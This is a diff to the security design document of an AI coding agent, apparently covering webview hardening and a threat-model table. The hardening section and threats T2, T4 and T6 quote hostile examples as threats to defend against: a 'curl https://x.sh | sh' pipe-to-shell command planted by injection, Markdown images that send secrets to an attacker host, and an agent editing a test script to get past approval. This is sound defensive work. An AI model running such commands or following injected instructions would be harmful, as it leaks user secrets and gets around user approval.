@@ -43,7 +43,7 @@ flowchart TB
     rt -->|spawn after approval| cmds
     cmds --> deps
     host <-->|stdio JSON-RPC, method allowlist| rt
-    wbcore <-->|Tauri IPC, minimal capabilities| host
+    wbcore <-->|webview postMessage, allowlisted methods| host
 ```
 
 ## 3. Credentials (MVP)
@@ -213,8 +213,9 @@ Built from an allowlist (ADR-0011). Provider keys and Jesutobits internals are n
 
 ## 8. Workbench hardening
 
-- **Tauri capabilities:** the main window gets only Jesutobits' own commands (`rpc_call`, `pty_*`, `settings_*`, `secrets_set`, `secrets_delete`, `secrets_exists`, `extensions_*`, `dialog_pick_folder`, `app_*`) plus core window and event permissions. No `shell`, `fs` or `http` plugin access from the webview (NFR-008). No remote origins in any capability (RN-05, RN-06, RN-37). This rule is **load-bearing**: Tauri injects its IPC into the preview iframe, and capability URL scoping is what refuses the frame's calls (Spike S3). `capabilities_never_grant_remote_urls` in `apps/desktop/src-tauri/src/lib.rs` fails the build if any capability grants a `remote` URL.
-- **CSP (target):** `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: jesutobits-ext:; font-src 'self' jesutobits-ext:; connect-src` limited to Tauri's IPC endpoints; `frame-src http://127.0.0.1:* http://localhost:* jesutobits-ext:; worker-src 'self' blob:; object-src 'none'; base-uri 'none'; form-action 'none'`. `wasm-unsafe-eval` is needed by the companion renderer (ADR-0006).
+- **Webviews (since 0.3.0):** the agent panel, preview panel, Studio section and Learning Centre are VS Code webviews with a strict CSP and a per-load nonce. They reach the extension only by `postMessage`, and the extension accepts only methods allowlisted in `packages/protocol/src/webview.ts`, schema-checked (invariant 4). No webview can read a secret.
+- **The fork's popups** (welcome, account) run in VS Code's own window and call only `jesutobits.*` commands, which return whether a key exists and what OpenRouter says about it, never the key.
+- *Tauri app (archived):* the main window got only Jesutobits' own commands, with a CSP limiting `connect-src` to Tauri's IPC.
 - **Markdown:** rendered with raw HTML disabled; links shown with their real URL on hover and opened in the external browser after confirmation for non-HTTPS links; **remote images are never loaded** (placeholder with "Load image from example.com?"). This closes the classic exfiltration channel where injected text makes the model emit `![](https://attacker/?data=...)`.
 - **Untrusted text** (file contents, logs, bridge strings, extension READMEs) is rendered as text or through the same sanitised Markdown renderer. No `dangerouslySetInnerHTML` outside the sanitiser module (lint rule).
 
@@ -263,7 +264,7 @@ Jesutobits assumes injected instructions **will** sometimes reach the model (fro
 | T2 | Injection asks the agent to run `curl https://x.sh \| sh` | Arbitrary code | Shell commands always ask; network flagged; card shows exact command | User may approve |
 | T3 | Malicious dependency's `postinstall` runs during `npm install` | Arbitrary code | Install always asks; "without scripts" option; lockfile diff shown | High if user installs a malicious package (same as any dev workflow) |
 | T4 | Agent edits the `test` script, then runs the session-approved `npm test` | Bypass of approval | Script fingerprinting invalidates the rule (4.4) | Low |
-| T5 | Preview app posts forged `bridge.selection` or tries Tauri IPC | Spoofed UI, privileged calls | IPC blocked for frames; origin + nonce + schema; bridge cannot write | Spoofed selection only (harmless) |
+| T5 | Preview app posts forged `bridge.selection` or tries to reach the extension | Spoofed UI, privileged calls | IPC blocked for frames; origin + nonce + schema; bridge cannot write | Spoofed selection only (harmless) |
 | T6 | Model output includes `![](https://attacker/?q=<secret>)` | Data exfiltration | Remote images never auto-load | Low |
 | T7 | Theme SVG with `<script>` or companion Lottie with expressions | Code execution in Workbench | Validator rejects; DOMPurify on load; no `lottie-web` | Low |
 | T8 | `.jesutobitspkg` with `../../` paths (zip slip) | Overwrite user files | Host archive checks, staging dir | Low |
@@ -275,7 +276,7 @@ Jesutobits assumes injected instructions **will** sometimes reach the model (fro
 | T14 | Loop burns credits | Financial loss | Step, time and cost budgets; loop guard | Low |
 | T15 | XSS in the Workbench approves its own requests | Bypass of approvals | CSP, sanitiser-only HTML, no remote content, extensions isolated | Medium (most valuable target) |
 | T16 | Generic dev server binds `0.0.0.0` | App exposed on LAN | Warning; instrumented mode binds localhost | Medium |
-| T17 | Tampered update | Full compromise | Signed updates with Tauri updater, pinned public key, HTTPS | Low |
+| T17 | Tampered download | Full compromise | No auto-update; releases come from GitHub over HTTPS with `SHA256SUMS.txt`; code signing before 1.0 (ROADMAP Q7) | Medium until signed |
 
 ## 16. Residual risks and future hardening
 
